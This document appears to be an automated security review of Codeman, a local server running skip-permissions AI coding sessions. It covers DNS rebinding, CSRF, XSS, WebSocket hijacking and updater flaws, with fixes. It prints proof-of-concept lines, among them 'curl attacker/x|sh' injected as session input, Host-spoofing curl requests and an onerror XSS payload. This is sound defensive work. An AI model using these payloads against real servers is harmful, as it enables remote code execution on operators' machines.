# Codeman Security Review — 2026-06-09

> **⚠️ Remediation status (updated 2026‑06‑09):** the two CRITICALs and 5 of the 7
> HIGHs below were **fixed the same day in commit `c669518` (shipped as 0.9.5)** —
> an always‑on `Host`‑header + cross‑site `Origin` allowlist (`registerHostGuard`),
> a raw `text/plain` body parser, a WebSocket `Origin`/`Host` check, and
> HTML‑escaped subagent‑panel sinks. **The present‑tense "is exploitable" wording
> below describes the pre‑fix v0.9.4 state.** Still open: **H2** (the self‑updater
> trusts an unsigned git tag — needs signing infra) and dropping CSP
> `'unsafe-inline'` (needs a nonce migration; H4's escaping already neutralises the
> known XSS). Per‑finding breakdown in the *Implementation status* section below;
> regression tests in `test/network-host-guard.test.ts`.

**Scope:** whole codebase (branch `master`, v0.9.4). Adversarial multi-agent review: 10 dimension specialists → diverse-lens skeptic verification of every finding (HIGH/CRITICAL got 3 independent refutation passes) → completeness-critic sweep. 47 raw findings → **25 survived verification** (+1 from the critic). 22 were refuted (mostly "already inside the OS trust boundary" same-uid claims and doc-accuracy nits). Several exploits were **confirmed live** with `curl` against throwaway test ports.

## TL;DR — the one thing that matters

The default, *documented-as-safe* configuration (loopback bind + no `CODEMAN_PASSWORD`) is **remotely exploitable to RCE by any website the operator merely visits.** Every session runs `--dangerously-skip-permissions`, so "send input to a session" == "run arbitrary shell as the operator." Two missing, standard controls cause almost all of the serious findings:

- **(A) No `Host`-header allowlist** → DNS-rebinding turns a malicious page into a same-origin client of `127.0.0.1`.
- **(B) No global Origin/CSRF check on state-changing routes, plus a global `text/plain` body parser** → a plain cross-site `fetch` (a CORS "simple request", no preflight) submits JSON to the API. Write-only access is enough for RCE.

Fix (A) + (B) + drop CSP `unsafe-inline` / escape the subagent panel, and the two CRITICALs and 5 of the 7 HIGHs collapse.

> Note: this is *not* a claim that the existing trust model is wrongly documented. `docs/security-architecture.md` is unusually honest. The problem is that the model assumes "loopback + no password" is safe against a browsing operator — and the browser (DNS rebinding + the text/plain parser) breaks that assumption.

---

## CRITICAL

### C1 — No `Host`-header allowlist → DNS rebinding → full API → RCE (default no-auth install)
`src/web/server.ts:1697` (listen, no host validation) · `src/web/middleware/auth.ts:163-211` (no Host check). Actor: A2 (malicious website) ⇒ A1-equivalent RCE. **3/3 verifiers confirmed; live-confirmed.**

A page on `evil.example` (DNS TTL≈1s) is loaded by the operator, then DNS is rebound to `127.0.0.1`. Subsequent `fetch('http://evil.example:3000/...')` are now **same-origin** with Codeman (so CORS never engages), and with no password there are no credentials to miss. The page does `POST /api/sessions {workingDir}` → reads the session id from the same-origin response → `POST /api/sessions/<id>/input {input:"curl attacker/x|sh\r"}`. Confirmed: `curl -H 'Host: attacker.evil.com' -X POST -d '{"workingDir":"/tmp"}' http://127.0.0.1:<port>/api/sessions` → `200`.

**Fix:** early `onRequest` hook (before routing) that rejects any request whose `Host` is not in `{localhost, 127.0.0.1, ::1, configured --host, CODEMAN_ALLOWED_HOSTS}` with `403`. This is *the* standard anti-rebinding control for localhost dev servers and the single highest-value fix.

### C2 — Global `text/plain` content-type parser JSON-parses every body → cross-site CSRF *without* rebinding
`src/web/server.ts:710-716`. Actor: A2. **3/3 verifiers confirmed; live-confirmed.**

A global parser registered for `text/plain` runs `JSON.parse` on the body of **every** route. `text/plain` is a CORS *simple* content type, so a cross-origin `fetch(..., {method:'POST', headers:{'Content-Type':'text/plain'}, body:'{...}'})` reaches the handler **with no preflight**. SameSite=lax + reflected-CORS don't help: on the no-auth default there's no cookie to gate, and the side effect happens regardless of whether the attacker can read the response. Confirmed: cross-origin (`Origin: https://evil.com`) `POST /api/sessions` with `Content-Type: text/plain` → `200` (session created); same against `/input` parsed+validated the JSON body.

**Fix:** remove the global `text/plain` JSON parser (parse the one crash-diagnostics body inside its own handler), **and** add a global same-origin/CSRF guard on all non-GET routes (see H3). Combine with C1's Host allowlist so the host comparison itself can't be rebound.

---

## HIGH

### H1 — Self-update is unauthenticated/CSRF-triggerable → forced update + RCE pivot
`src/web/routes/system-routes.ts:313`. Actor: A1/A2. **3/3 confirmed.**
`fetch('http://127.0.0.1:3000/api/system/update',{method:'POST',mode:'no-cors'})` from any page (no body, no preflight) kicks off the detached updater on a no-password install. On its own: forced pull/rebuild/restart (availability + forces the latest tag). Chained with H2: full RCE.
**Fix:** require Origin/CSRF on this route *independent of the password*; refuse self-update when no password is set; mint a confirmation token via a prior GET.

### H2 — Self-updater builds an **unsigned, unverified** git tag (no signature / commit pin) *(contested 2/3)*
`scripts/self-update.sh:139`. Actor: A5 + A1/A2 trigger.
`isValidReleaseTag` validates only the *tag name* (`^(codeman|aicodeman)@\d+\.\d+\.\d+$`) and version ordering — never the commit. Anyone who can push a `codeman@9.9.9` tag (or compromise release CI) gets `git checkout --force` + `npm install` (arbitrary lifecycle scripts) + build + restart, as the operator. One verifier refuted on the basis that the *trigger* is auth-gated when a password is set — true, but the default has no password and H1 supplies the trigger.
**Fix:** verify integrity, not just the name — GPG-signed tags (`git verify-tag` against a shipped maintainer key) or pin to a SHA published out-of-band; `npm ci --ignore-scripts` + an explicit audited build step; pin the remote to the expected GitHub repo.

### H3 — CSRF/Origin validation exists on exactly one route; the RCE-enabling routes have none
`src/web/routes/session-routes.ts:1570-1600` (only `paste-image` is protected) vs `:229` create, `:595` input, `:635` send-key, `:404` delete. Actor: A2. **3/3 confirmed.**
The team clearly knows the correct control (it's on `paste-image`) but didn't apply it broadly.
**Fix:** a shared `onRequest` guard for all non-GET API routes: `Origin`/`Referer` host ∈ Host allowlist **and** `Sec-Fetch-Site == same-origin`. Global, not per-route.

### H4 — Stored XSS in the subagent activity panel (raw AI tool name/inputs → `innerHTML`; `unsafe-inline` ⇒ executes)
`src/web/public/panels-ui.js:808-811` (and `:1403`). Actor: A3 (AI/subagent/MCP output), reachable by A1/A2. **3/3 confirmed.**
`renderSubagentDetail()` sets `innerHTML` with un-escaped `a.tool`, `toolDetail.primary`, `displayText`. A subagent tool **name** (no length cap) or a short Bash command like `<img src=x onerror=...>` (28 chars, under the 100-char input truncation) is parsed as HTML in the operator's DOM; CSP `unsafe-inline` lets the `onerror` run → reads cookies, drives every same-origin API (i.e. types commands into a skip-permissions session), or hits the self-updater. `_renderActivityItem` is inconsistent: line 1404 escapes, line 1403 doesn't.
**Fix:** `escapeHtml()` those fields at the sink; and drop `unsafe-inline` from `script-src` (move inline handlers to `addEventListener`/nonce) so a missed escape can't execute.

### H5 — WebSocket terminal route has no Origin/Host check (CSWSH + rebinding → drives skip-permissions agent)
`src/web/routes/ws-routes.ts:62`. Actor: A2 / A1-via-tunnel. **3/3 confirmed.**
WS upgrades aren't subject to SOP; with no password and no Origin/Host check, a cross-site page (or rebound origin) opens `ws://host/ws/sessions/<id>/terminal` and sends `{"t":"i","d":"curl attacker/x|bash\r"}`.
**Fix:** validate `Origin` + `Host` on the upgrade, `socket.close(4003)` on mismatch (reuse the loopback-origin logic + the C1 Host allowlist).

### H6 — `PUT /api/settings {tunnelEnabled:true}` spawns a public cloudflared tunnel (CSRF/rebinding publishes the authless instance) *(completeness-critic find)*
`src/web/routes/system-routes.ts:523-535`. Actor: A2 ⇒ A1. **Confirmed; no CSRF on this route.**
If `cloudflared` is installed (the project encourages it), a cross-site `PUT` flips on a tunnel; the public `*.trycloudflare.com` URL is broadcast over SSE and exposed at `GET /api/tunnel/info` / `/api/tunnel/qr`. The attacker reads it → unauthenticated **internet** access to the skip-permissions API.
**Fix:** treat tunnel-start as privileged — CSRF/Origin check on `PUT /api/settings`; refuse to start a tunnel when `CODEMAN_PASSWORD` is unset; don't echo the public URL on unauthenticated endpoints.

### (H→operational) The no-password default *is* the unauthenticated RCE surface once reachable off-host *(contested 2/3)*
`src/web/middleware/auth.ts:45-46`. This is the *documented* trust boundary, so it's operational hardening rather than a code bug: on `--host 0.0.0.0`/LAN/tunnel without a password, any client `POST /input` → RCE. **Fix:** fail-closed (or auto-generate+print a random password) when binding non-loopback / starting a tunnel without one; constrain `workingDir` to an allowlist (cases dir / `$HOME`) to shrink blast radius.

---

## MEDIUM

| # | Finding | Location | Fix |
|---|---------|----------|-----|
| M1 | **Command injection via *discovered* tmux session name** — `muxName` taken verbatim from a live tmux session (only `startsWith('codeman-')` filtered), flows into double-quoted `execSync` in `sessionExists()`/`killSession()` **without** `isValidMuxName`. Reached on boot via `startInteractive→muxSessionExists`. Actor A4 (shared `tmux -L codeman` socket). | `src/tmux-manager.ts:925`, `:1065` | Convert these two sinks to argv form (`execFile('tmux',[...,'-t',muxName])`) like the others, **and/or** reject discovered names failing `SAFE_MUX_NAME_PATTERN` in `reconcileSessions()`. |
| M2 | **Forged hook events over a loopback-terminating tunnel** — `/api/hook-event` bypasses auth on loopback IP, but cloudflared/tailscale-serve connect *from* `127.0.0.1` (Fastify `trustProxy:false`). A forged `idle_prompt`/`stop` drives a respawn that injects the operator's update prompt + `/clear` + `/init` into a live skip-permissions session; forged `transcript_path` streams arbitrary readable files to SSE. The in-code comment "prevents forged hook events via tunnel/LAN" is **false**. *(contested 2/3; impact real)* | `src/web/middleware/auth.ts:83-90` | Gate the bypass on a per-boot shared secret in the hook curl (`X-Codeman-Hook-Secret`), not `req.ip`. Require a password when a tunnel is active. Reject `transcript_path` outside the session workingDir. Fix the comment. |
| M3 | **Session cookie binds nothing** — recorded `ip`/`ua` never enforced on reuse → stolen-cookie replay from anywhere; no absolute lifetime cap (refresh-on-get extends forever). | `src/web/middleware/auth.ts:102-106` | Compare `record.ip` (+ optional UA hash) on reuse; cap absolute session lifetime. |
| M4 | **Non-loopback bind w/o password starts and only warns** (0.9.0 warn-don't-block) → real A1 exposure on misconfig; warning is a one-time stderr line. | `src/web/server.ts:1708-1724`, `src/cli.ts:486-500` | Consider fail-closed default; at minimum log to `session-lifecycle.jsonl` + persistent UI banner. |
| M5 | **tail-file SSE route escapes the per-session boundary** — uses a *divergent* validator that `~`-expands and whitelists `/var/log` + `~/logs`, so an authorized caller streams files outside every session's workingDir (e.g. `/var/log/auth.log`). Doc overclaims "all file routes share `validateSessionFilePath`". | `src/web/routes/file-routes.ts:341`, `src/file-stream-manager.ts:400` | Route through `validateSessionFilePath()`, or drop the extra roots + `~` expansion; fix the doc. |
| M6 | **Session display name accepts arbitrary chars** (`z.string().max(100)`, no regex) — safe only by downstream escaping (which H4 shows isn't uniform). | `src/web/schemas.ts:135,138,384` | Strip control chars / angle brackets at the schema (defense-in-depth). |
| M7 | **Blind SSRF via attacker-supplied web-push endpoint**, triggerable through the loopback-exempt `/api/hook-event` (and via C2/CSRF). Stored endpoint URL is fetched server-side. | `src/web/server.ts:1630` (+ `src/push-store.ts`) | Allowlist known push-service hosts; reject endpoints resolving to loopback/private/link-local/169.254.169.254; re-check IP at send time (rebind-safe). |

---

## LOW / INFO (hardening)

- **L1** QR per-IP failure limiter + oldest-cookie eviction + body-less `/api/auth/revoke` → session/lockout DoS, all amplified behind a shared tunnel IP. `system-routes.ts:182-194` *(contested)*.
- **L2 / L3** CSP `script-src 'unsafe-inline'` (nullifies XSS defense-in-depth app-wide) + unused `https://cdn.jsdelivr.net` with no SRI. `auth.ts:170-176` *(contested; tie into H4 fix)*.
- **L4** `trustProxy:false` + loopback tunnels defeat the IP-based hook-event exemption (root cause of M2). `auth.ts:79-90`.
- **L5** ralph-wizard file route uses bypassable `startsWith()` prefix containment. `case-routes.ts:424`.
- **L6** Push subscription store has no cap → unbounded growth. `push-store.ts:70-95`.
- **L7** VAPID private key / state / settings / audit log written `0644` in a `775` data dir; the implied `0o700` hardening is a no-op. `config/instance.ts:54` *(contested — A4/same-host only)*.
- **L8** Unauthenticated `DELETE /api/sessions[/:id]` on the default install. `session-routes.ts:404` *(contested)*.
- **INFO** Wide `record`/`passthrough` schemas allow arbitrary-key mass-assignment into per-instance JSON config. `schemas.ts:505,509-516`.
- **INFO** `docs/security-architecture.md:301` overclaims supply-chain hardening and omits the self-updater as a trust surface (see H1/H2).

---

## What's solid (credit where due)

The verifiers **refuted 22** candidate findings — the defenses below held under adversarial scrutiny:

- **Request-facing command injection is well defended.** Every shell-interpolated value from an HTTP route (`workingDir`, `model`, `allowedTools`, `effort`, `resumeSessionId`, OpenCode config, env-override key/value, span-displays URL, cloudflared port, update tag, tail path) is either argv-form (no shell) or allowlist-regex-validated at the sink. `muxName=codeman-<uuid8>` is server-generated. The only gap is the *discovered*-name path (M1).
- **Self-update command construction** is hardened (argv spawn, anchored `isValidReleaseTag`, double-quoted `$TAG`). The weakness is *integrity* (H2), not injection.
- **Primary file-read boundary** `validateSessionFilePath` (realpath-before-check + `relative()` containment) correctly resists `../`, absolute paths, symlinks, sibling-prefix tricks; image upload uses `lstat`+`O_NOFOLLOW`+`O_EXCL`.
- **Input validation** funnels through Zod + `parseBody`; env-override allowlist enforces the `CLAUDE_CODE_`/`OPENCODE_` prefix **and** a `BLOCKED_ENV_KEYS` set (`PATH`, `LD_PRELOAD`, `NODE_OPTIONS`, …) re-checked at apply time.
- **Auth pipeline internals** are competent: timing-safe Basic compare, 256-bit opaque server-side session tokens, rejection-sampled base62 QR codes over 256-bit tokens with single-use atomic consumption, `logger:false` (no credential logging).
- **Same-uid "attacks"** (tmux socket input injection, `/proc/<pid>/environ`, tmux `showenv` key disclosure) were refuted as already inside the OS trust boundary — a same-user process can already do anything to its peers.

---

## Implementation status (2026-06-09)

Priority fixes 1–3 + 5 landed in the same session (verified live with curl/ws against an isolated instance):

- ✅ **C1** — `Host`-header allowlist (`registerHostGuard` in `middleware/auth.ts`, policy in `network-auth-policy.ts`). Allows loopback/any-IP-literal/bind-host/`.ts.net`/`.trycloudflare.com`/`.cfargotunnel.com`/active-tunnel/`CODEMAN_ALLOWED_HOSTS`; rejects rebound custom domains.
- ✅ **C2** — global `text/plain` parser no longer JSON-parses (crash-diag self-parses); plus the global cross-site Origin guard.
- ✅ **H1, H3, H6** — global Origin/CSRF guard on all non-GET routes (covers self-update, session create/input, settings/tunnel).
- ✅ **H4** — escaped all AI-derived sinks in `panels-ui.js` (tool name, tool detail, toolUseId, displayText).
- ✅ **H5** — Origin/Host check on the WebSocket upgrade (`ws-routes.ts`).
- ⏳ **H2** — deferred: needs signed-tag infra (no maintainer key yet); `npm ci --ignore-scripts` would break node-pty's native build, so not applied blindly.
- ⏳ **CSP `unsafe-inline` removal** — deferred: inline `onclick=` handlers are pervasive; needs a nonce migration (H4's sink-escaping already neutralizes the known XSS).

Tests: `test/network-host-guard.test.ts` (19), `test/routes/ws-routes.test.ts` (22). Operational note: any custom reverse-proxy domain must be added via `CODEMAN_ALLOWED_HOSTS=host,.suffix`.

## Remediation priority

1. **Add a `Host`-header allowlist** (`onRequest`, pre-routing). → kills C1, blunts H5/H6 rebinding. *Highest value, smallest change.*
2. **Remove the global `text/plain` JSON parser + add a global same-origin/CSRF guard** on all non-GET routes. → kills C2, H1, H3, H6; blunts M7. Reuse the `paste-image` pattern globally.
3. **Drop CSP `unsafe-inline` and `escapeHtml()` the subagent panel fields** (`panels-ui.js:808-811,1403`). → kills H4, closes L2/L3.
4. **Add tag-signature/commit verification to the self-updater** + `npm ci --ignore-scripts`. → kills H2.
5. **Validate Origin/Host on the WS upgrade** (`ws-routes.ts:62`). → kills H5.
6. **Refuse to start a tunnel / non-loopback bind without a password** (or auto-generate one). → closes the operational HIGH + M4 + H6's precondition.
7. Sweep the MEDIUMs: M1 (argv tmux sinks), M2 (hook secret), M5 (tail validator), M7 (push SSRF allowlist).

*Generated by an automated adversarial multi-agent review (97 agents, ~4.8M tokens). Findings were independently verified but should be confirmed by a human before remediation; the live-confirmed exploits (C1, C2) are the highest-confidence items.*
